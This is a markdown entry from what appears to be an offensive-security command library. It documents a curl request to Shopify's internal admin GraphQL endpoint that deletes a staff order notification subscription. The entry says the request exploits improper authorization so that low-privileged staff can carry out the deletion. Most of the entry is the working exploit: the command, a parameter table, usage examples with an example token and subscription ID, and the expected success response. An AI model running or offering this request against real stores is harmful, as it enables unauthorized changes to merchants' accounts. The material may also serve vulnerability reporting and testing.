---
data: >-
  curl -X POST
  https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores
  -H "Content-Type: application/json" -H "X-Shopify-Access-Token:
  YOUR_STAFF_TOKEN" -d '{"query":
  "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}}"
  }'
tags:
  - graphql
  - shopify
  - deletion
type: command
executor: curl
platforms:
  - Web
id: 7930f08d-d1b5-41ad-96d1-5567bbc7117e
created_at: '2025-12-14T17:29:29.014Z'
updated_at: '2025-12-14T17:29:29.014Z'
verified: false
validated: true
submitted: true
---
# staffOrderNotificationSubscriptionDelete-Mutation

## Command

```bash
curl -X POST https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: YOUR_STAFF_TOKEN" \
  -d '{"query": "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}}" }'
```

## Description

This curl command sends a GraphQL mutation to delete a staff order notification subscription in Shopify, exploiting improper authorization to perform the action with low privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores` | GraphQL API endpoint | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "X-Shopify-Access-Token: YOUR_STAFF_TOKEN"` | Authentication token from staff session | Yes |
| `-d '{...}'` | JSON payload with mutation query | Yes |
| `staffOrderNotificationSubscriptionId` | GID of the subscription to delete | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: abc123" \
  -d '{"query": "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}}" }'
```

### Advanced Usage

Use with variables for dynamic GID:

```bash
GID="gid://shopify/StaffOrderNotificationSubscription/82867191864"
curl -X POST https://example.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores \
  -H "Content-Type: application/json" \
  -H "X-Shopify-Access-Token: abc123" \
  -d "{\"query\": \"mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\\"$GID\"){userErrors{message}}}\" }"
```

## Expected Output

Successful deletion returns: {"data":{"staffOrderNotificationSubscriptionDelete":{"userErrors":[]}}}. Errors appear in userErrors array if authorization fails or ID is invalid.

## Related

- [[Related Procedure]]
